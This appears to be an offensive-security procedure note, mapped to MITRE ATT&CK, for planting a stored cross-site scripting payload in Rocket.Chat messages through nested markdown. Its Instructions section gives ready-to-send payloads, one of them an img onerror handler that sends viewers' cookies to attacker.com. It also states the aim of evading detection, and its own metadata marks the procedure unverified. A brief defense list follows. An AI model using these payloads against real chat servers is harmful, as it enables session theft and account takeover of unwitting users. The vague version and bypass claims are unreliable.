---
id: uuid-inject-xss-rocket-chat
tags:
  - xss
  - stored-xss
  - injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-13T23:52:38.740Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-Stored-XSS-Payload-in-Rocket-Chat-Messages

## Summary

This procedure exploits improper sanitization of nested markdown tags in Rocket.Chat messages to inject and store arbitrary JavaScript code, which persists and executes when any user views the message, enabling further attacks like privilege escalation.

## Description

Rocket.Chat renders messages using markdown, but fails to properly sanitize nested tags (e.g., bold inside italic), allowing attackers to break out and inject HTML/JavaScript. The payload is stored server-side and served to all viewers, making it a persistent stored XSS. This targets web clients and affects all users in the channel. Prerequisites include a valid user account; no special privileges needed. Expected outcomes: Malicious script stored and ready for execution on render.

## Requirements

1. Access to a vulnerable Rocket.Chat instance (versions < 3.11 etc.)
2. Valid user login credentials
3. Ability to post messages in a shared channel
4. Browser for crafting and sending the payload

## Defense

Defensive measures and detection strategies:

- Upgrade to patched versions (3.11, 3.10.5, 3.9.7, 3.8.8)
- Implement strict markdown sanitization with libraries like DOMPurify
- Monitor for anomalous message content with unusual nesting
- Enable Content Security Policy (CSP) to block inline scripts

## Objectives

1. Store malicious JavaScript in a message without detection
2. Ensure payload executes on client-side render for any viewer
3. Set up for downstream exploits like privilege manipulation

## Instructions

### Step 1: Log In and Navigate to Channel

**Context**: Gain access to the target Rocket.Chat instance and select a channel where victims will view messages.

Log in via the web interface at the Rocket.Chat URL.

### Step 2: Craft and Send XSS Payload

**Context**: Construct a payload using nested markdown to evade sanitization, injecting a script tag or event handler.

Example payload (send as a message):

```
**_**<script>alert('XSS');</script>**_**
```

Or more advanced for evasion:

```
* **<img src=x onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">** *
```

> This nests italic (*) around bold (**), breaking sanitization to inject <img> with onerror handler. Expected output: Message posts; inspect HTML source to confirm <script> or <img> is present unsanitized.

### Step 3: Verify Storage

**Context**: Confirm the payload is persisted server-side.

Refresh the channel or view in an incognito session; check message source for injected code.

> Expected output: Injected elements visible in DOM inspector.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[markdown-injection]]
